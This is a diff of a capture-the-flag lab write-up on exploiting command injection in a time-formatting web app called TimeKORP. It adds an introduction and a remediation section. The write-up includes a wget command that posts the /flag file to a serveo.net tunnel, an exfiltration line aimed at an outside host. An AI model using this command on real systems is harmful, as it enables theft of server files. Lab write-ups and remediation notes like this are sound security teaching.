@@ -1,6 +1,7 @@
+TimeKORP is a web application that fetches the current time from the backend server. However, it is vulnerable to command injection. 
 Very exciting twists in this lab, and lots of lessions learned.
 
-Discover the injectable parameter by intercepting a request with Burp Suite.
+To solve the challenge, discover the injectable parameter by intercepting a request with Burp Suite.
 `/?format=%H:%M`
 this returned the time from the server.
 
@@ -17,7 +18,11 @@ Data exfiltration throught wget and a serveo tunnel
 ```
 wget --post-file=/flag https://fd606f13904bcb33418d892c3c293f6c.serveo.net
 ```
-
+Remediation
+- Do not invoke shell commands. Instead, use the programming language's date and time functions.
+- Do not try to sanitise user input. Instead, have a strick whitelist and use a time-formatting API.
+- Employ defence-in-depth, that is, least privilege, segregation (app has no access to sensitive files), employ egress restriction.
+   
 <img width="1811" height="990" alt="flag1" src="https://github.com/user-attachments/assets/4d151f84-7373-416c-acaf-2ad4802078c6" />
 
 <img width="664" height="675" alt="serveo" src="https://github.com/user-attachments/assets/aa8c02e0-314f-42af-8c7f-f1e343afa9c0" />
